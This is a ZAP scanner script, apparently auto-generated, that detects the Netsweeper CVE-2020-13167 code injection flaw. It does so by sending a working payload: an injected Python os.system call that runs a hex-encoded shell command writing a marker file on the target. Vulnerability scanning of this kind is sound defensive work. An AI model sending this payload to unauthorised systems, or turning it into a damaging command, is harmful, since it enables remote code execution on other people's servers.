/*
 * MIT License
 *
 * Copyright (c) 2022 Sepehrdad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

// auto generated by nuclei2zap
var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2020-13167] Netsweeper <=6.4.3 - Python Code Injection"
var DESCRIPTION = "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters."
var SOLUTION = "Apply all relevant security patches and product upgrades."
var REFERENCE = "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/"
var OTHER = "see: https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says"

function log(msg) {
	print("[" + this["zap.script.name"] + "] " + msg);
}

function alert(as, msg, evidence) {
	as.newAlert()
		.setRisk(RISK)
		.setConfidence(CONFIDENCE)
		.setName(TITLE)
		.setDescription(DESCRIPTION)
		.setEvidence(evidence)
		.setOtherInfo(OTHER)
		.setSolution(SOLUTION)
		.setReference(REFERENCE)
		.setMessage(msg)
		.raise();
}

function scanNode(as, msg) {

	var uri = msg.getRequestHeader().getURI();

	if (uri.getPath() != null && uri.getPath().length() > 1) {
		log("ignoring scan for " + uri);
		return;
	}

	log("scanning " + uri);

	// Copy requests before reusing them
	msg = msg.cloneRequest();

	uri = msg.getRequestHeader().getURI();
	uri.setPath("/webadmin/tools/unixlogin.php");
	uri.setEscapedQuery("login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5");

	// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
	as.sendAndReceive(msg, false, false);

	var response_header = msg.getResponseHeader();
	var response_body = msg.getResponseBody();

	var evidence_idx = response_body.toString().indexOf("nonexistent");

	// Test the response here, and make other requests as required
	if (response_header.getStatusCode() == 200 && evidence_idx >= 0) {
		alert(as, msg, response_body.toString().substring(evidence_idx));
	}
}

function scan(as, msg, param, value) {
	return;
}
